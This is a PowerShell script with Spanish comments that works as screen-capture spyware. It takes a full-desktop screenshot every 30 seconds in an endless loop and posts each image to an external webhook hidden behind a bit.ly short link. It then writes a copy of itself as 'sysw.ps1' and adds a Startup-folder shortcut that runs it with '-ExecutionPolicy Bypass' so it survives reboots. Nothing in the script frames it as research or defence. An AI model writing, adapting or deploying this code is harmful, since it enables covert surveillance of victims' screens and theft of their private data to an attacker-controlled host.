# Primera parte: Captura y envía la imagen al webhook
$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas

# Detección de URL acortada
if ($hookurl.Length -le 121) {
    Write-Host "Shortened Webhook URL Detected.00."
    $hookurl = (Invoke-RestMethod -Uri $hookurl).url
}

do {
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    Invoke-WebRequest -Uri $hookurl -Method POST -InFile $Filett
    Start-Sleep 1
    Remove-Item -Path $Filett
    Start-Sleep $seconds
} while ($true)

# Pequeño retraso para permitir que la primera parte se inicie correctamente
Start-Sleep -Seconds 5

# Segunda parte: Descarga el script completo y crea un acceso directo para ejecutarlo al iniciar Windows
$scriptContent = @"
# Contenido del script principal (sysw.ps1)
\$hookurl = "https://bit.ly/chu_kbras"
\$seconds = 30 # Intervalo entre capturas

# Detección de URL acortada
if (\$hookurl.Length -le 121) {
    Write-Host "Shortened Webhook URL Detected..000."
    \$hookurl = (Invoke-RestMethod -Uri \$hookurl).url
}

do {
    \$Filett = "\$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    \$Width = \$Screen.Width
    \$Height = \$Screen.Height
    \$Left = \$Screen.Left
    \$Top = \$Screen.Top
    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    Invoke-WebRequest -Uri \$hookurl -Method POST -InFile \$Filett
    Start-Sleep 1
    Remove-Item -Path \$filett
    Start-Sleep \$seconds
} while (\$true)
"@

# Ruta para guardar el script principal
$output = "$env:USERPROFILE\sysw.ps1"

# Guardar el contenido del script principal en un archivo
Set-Content -Path $output -Value $scriptContent

# Creación de acceso directo en la carpeta de inicio del usuario
$shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutLocation)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$output`""
$shortcut.Save()
